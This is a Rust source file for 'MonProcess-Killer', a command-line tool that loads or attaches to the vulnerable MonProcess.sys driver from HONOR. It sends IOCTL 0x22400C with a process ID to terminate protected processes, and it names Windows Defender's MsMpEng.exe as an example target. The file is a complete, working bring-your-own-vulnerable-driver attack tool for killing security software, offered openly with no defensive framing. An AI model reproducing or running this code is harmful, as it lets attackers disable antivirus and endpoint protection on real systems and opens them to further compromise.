use byovd_lib::{get_pid_by_name, send_ioctl, DriverConfig, Result};
use clap::Parser;

// ============================================================================
// Driver Configuration -- MonProcess.sys (HONOR HnRSMService)
// ============================================================================

struct MonProcessDriver;

impl DriverConfig for MonProcessDriver {
    fn driver_name(&self) -> &str {
        "MonProcess"
    }

    fn driver_file(&self) -> &str {
        "MonProcess.sys"
    }

    fn device_path(&self) -> &str {
        "\\\\.\\MonProcessX64"
    }

    fn ioctl_code(&self) -> u32 {
        0x22400C
    }

    fn build_ioctl_input(&self, pid: u32, _process_name: &str) -> Vec<u8> {
        pid.to_ne_bytes().to_vec()
    }
}

// ============================================================================
// CLI
// ============================================================================

#[derive(Parser)]
#[command(name = "MonProcess-Killer", version, author = "BlackSnufkin")]
#[command(about = "BYOVD PPL-bypassing process killer using MonProcess.sys (HONOR)")]
struct Cli {
    /// Target process name (e.g., MsMpEng.exe)
    #[arg(short = 'n', long = "name", required = true)]
    process_name: String,

    /// Attach to an already-loaded driver -- skip service install/start/stop
    #[arg(short = 'a', long = "attach")]
    attach: bool,
}

// ============================================================================
// Main
// ============================================================================

fn main() -> Result<()> {
    let cli = Cli::parse();
    let driver = MonProcessDriver;

    if cli.attach {
        println!("[*] Attach mode: assuming driver is already loaded");
        let pid = get_pid_by_name(&cli.process_name)
            .ok_or_else(|| format!("Process '{}' not found", cli.process_name))?;
        println!("[*] Target {} -> PID {}", cli.process_name, pid);
        send_ioctl(&driver, pid, &cli.process_name)?;
        println!("[+] IOCTL dispatched");
        Ok(())
    } else {
        byovd_lib::run(&driver, &cli.process_name, None)
    }
}
